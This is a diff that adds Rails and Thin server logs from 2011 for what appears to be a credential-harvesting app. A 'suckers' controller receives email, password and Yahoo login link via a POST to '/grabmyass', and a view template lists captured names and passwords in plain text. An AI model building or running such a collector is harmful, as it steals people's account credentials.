@@ -1,0 +1,159 @@
+==> dyno-4549209.log <==
+>> Thin web server (v1.2.6 codename Crazy Delicious)
+>> Maximum connections set to 1024
+>> Listening on 0.0.0.0:46509, CTRL+C to stop
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+
+==> production.log <==
+
+
+
+Started GET "/" for 79.112.115.174 at Sun Jan 23 13:57:03 -0800 2011
+  Processing by SuckersController#index as HTML
+Rendered suckers/index.html.erb within layouts/application (1.6ms)
+Completed   in 5ms
+
+ActionView::Template::Error (No route matches {:action=>"show", :controller=>"suckers", :id=>"epicrose@yahoo.com"}):
+    13:         <td><strong><%= s.name %></strong></td>
+    14:         <td><%= s.pass %></td>
+    15:         <td><%= s.link %></td>
+    16:         <td><%= link_to "More", sucker_path(s.name)%> 
+    17:             <%= link_to "Delete", s, :method => :delete, :confirm => "You sure?",
+    18:                                 :title => "Delete #{s.name}" %>
+    19:         </td>
+  app/views/suckers/index.html.erb:16:in `_app_views_suckers_index_html_erb__20690162_23642554224100_0'
+  app/views/suckers/index.html.erb:11:in `each'
+  app/views/suckers/index.html.erb:11:in `_app_views_suckers_index_html_erb__20690162_23642554224100_0'
+
+
+
+Started GET "/" for 79.112.115.174 at Sun Jan 23 13:57:04 -0800 2011
+  Processing by SuckersController#index as HTML
+Rendered suckers/index.html.erb within layouts/application (1.6ms)
+Completed   in 22ms
+
+ActionView::Template::Error (No route matches {:action=>"show", :controller=>"suckers", :id=>"epicrose@yahoo.com"}):
+    13:         <td><strong><%= s.name %></strong></td>
+    14:         <td><%= s.pass %></td>
+    15:         <td><%= s.link %></td>
+    16:         <td><%= link_to "More", sucker_path(s.name)%> 
+    17:             <%= link_to "Delete", s, :method => :delete, :confirm => "You sure?",
+    18:                                 :title => "Delete #{s.name}" %>
+    19:         </td>
+  app/views/suckers/index.html.erb:16:in `_app_views_suckers_index_html_erb__20690162_23642554224100_0'
+  app/views/suckers/index.html.erb:11:in `each'
+  app/views/suckers/index.html.erb:11:in `_app_views_suckers_index_html_erb__20690162_23642554224100_0'
+
+
+
+Started GET "/" for 79.112.115.174 at Sun Jan 23 13:57:04 -0800 2011
+  Processing by SuckersController#index as HTML
+Rendered suckers/index.html.erb within layouts/application (1.7ms)
+Completed   in 31ms
+
+ActionView::Template::Error (No route matches {:action=>"show", :controller=>"suckers", :id=>"epicrose@yahoo.com"}):
+    13:         <td><strong><%= s.name %></strong></td>
+    14:         <td><%= s.pass %></td>
+    15:         <td><%= s.link %></td>
+    16:         <td><%= link_to "More", sucker_path(s.name)%> 
+    17:             <%= link_to "Delete", s, :method => :delete, :confirm => "You sure?",
+    18:                                 :title => "Delete #{s.name}" %>
+    19:         </td>
+  app/views/suckers/index.html.erb:16:in `_app_views_suckers_index_html_erb__20690162_23642554224100_0'
+  app/views/suckers/index.html.erb:11:in `each'
+  app/views/suckers/index.html.erb:11:in `_app_views_suckers_index_html_erb__20690162_23642554224100_0'
+
+
+
+Started GET "/" for 79.112.115.174 at Sun Jan 23 13:57:12 -0800 2011
+  Processing by SuckersController#index as HTML
+Rendered suckers/index.html.erb within layouts/application (1.6ms)
+Completed   in 41ms
+
+ActionView::Template::Error (No route matches {:action=>"show", :controller=>"suckers", :id=>"epicrose@yahoo.com"}):
+    13:         <td><strong><%= s.name %></strong></td>
+    14:         <td><%= s.pass %></td>
+    15:         <td><%= s.link %></td>
+    16:         <td><%= link_to "More", sucker_path(s.name)%> 
+    17:             <%= link_to "Delete", s, :method => :delete, :confirm => "You sure?",
+    18:                                 :title => "Delete #{s.name}" %>
+    19:         </td>
+  app/views/suckers/index.html.erb:16:in `_app_views_suckers_index_html_erb__20690162_23642554224100_0'
+  app/views/suckers/index.html.erb:11:in `each'
+  app/views/suckers/index.html.erb:11:in `_app_views_suckers_index_html_erb__20690162_23642554224100_0'
+
+
+
+Started GET "/" for 79.112.115.174 at Sun Jan 23 14:02:51 -0800 2011
+  Processing by SuckersController#index as HTML
+Rendered suckers/index.html.erb within layouts/application (3.6ms)
+Completed 200 OK in 15ms (Views: 4.3ms | ActiveRecord: 22.3ms)
+
+
+Started GET "/stylesheets/all.css" for 79.112.115.174 at Sun Jan 23 14:02:51 -0800 2011
+
+ActionController::RoutingError (No route matches "/stylesheets/all.css"):
+  
+
+
+
+Started GET "/suckers/epicrose" for 79.112.115.174 at Sun Jan 23 14:03:12 -0800 2011
+  Processing by SuckersController#show as HTML
+  Parameters: {"id"=>"epicrose"}
+Rendered suckers/show.html.erb within layouts/application (2.3ms)
+Completed 200 OK in 8ms (Views: 3.6ms | ActiveRecord: 3.8ms)
+
+
+Started GET "/suckers/epicrose" for 79.112.115.174 at Sun Jan 23 14:03:13 -0800 2011
+  Processing by SuckersController#show as HTML
+  Parameters: {"id"=>"epicrose"}
+Rendered suckers/show.html.erb within layouts/application (2.0ms)
+Completed 200 OK in 5ms (Views: 2.5ms | ActiveRecord: 2.1ms)
+
+
+Started GET "/stylesheets/all.css" for 79.112.115.174 at Sun Jan 23 14:03:13 -0800 2011
+
+ActionController::RoutingError (No route matches "/stylesheets/all.css"):
+  
+
+
+
+Started GET "/suckers" for 79.112.115.174 at Sun Jan 23 14:09:41 -0800 2011
+  Processing by SuckersController#index as HTML
+Rendered suckers/index.html.erb within layouts/application (3.2ms)
+Completed 200 OK in 7ms (Views: 3.7ms | ActiveRecord: 2.4ms)
+
+
+Started GET "/stylesheets/all.css" for 79.112.115.174 at Sun Jan 23 14:09:41 -0800 2011
+
+ActionController::RoutingError (No route matches "/stylesheets/all.css"):
+  
+
+
+
+Started POST "/grabmyass" for 79.112.115.174 at Sun Jan 23 14:09:51 -0800 2011
+  Processing by SuckersController#create as HTML
+  Parameters: {"sucker"=>{"name"=>"epicrose@yahoo.com", "link"=>"https://login.yahoo.com/config/login?", "pass"=>"fds"}}
+Rendered suckers/create.html.erb within layouts/application (2.1ms)
+Completed 200 OK in 64ms (Views: 2.8ms | ActiveRecord: 58.6ms)
+
+
+Started GET "/suckers" for 79.112.115.174 at Sun Jan 23 14:09:54 -0800 2011
+  Processing by SuckersController#index as HTML
+Rendered suckers/index.html.erb within layouts/application (1.9ms)
+Completed   in 7ms
+
+ActionView::Template::Error (No route matches {:action=>"show", :controller=>"suckers", :id=>"epicrose@yahoo.com"}):
+    13:         <td><strong><%= s.name %></strong></td>
+    14:         <td><%= s.pass %></td>
+    15:         <td><%= s.link %></td>
+    16:         <td><%= link_to "More", sucker_path(s.name)%> 
+    17:             <%= link_to "Delete", s, :method => :delete, :confirm => "You sure?",
+    18:                                 :title => "Delete #{s.name}" %>
+    19:         </td>
+  app/views/suckers/index.html.erb:16:in `_app_views_suckers_index_html_erb__20690162_23642554224100_0'
+  app/views/suckers/index.html.erb:11:in `each'
+  app/views/suckers/index.html.erb:11:in `_app_views_suckers_index_html_erb__20690162_23642554224100_0'
+
+
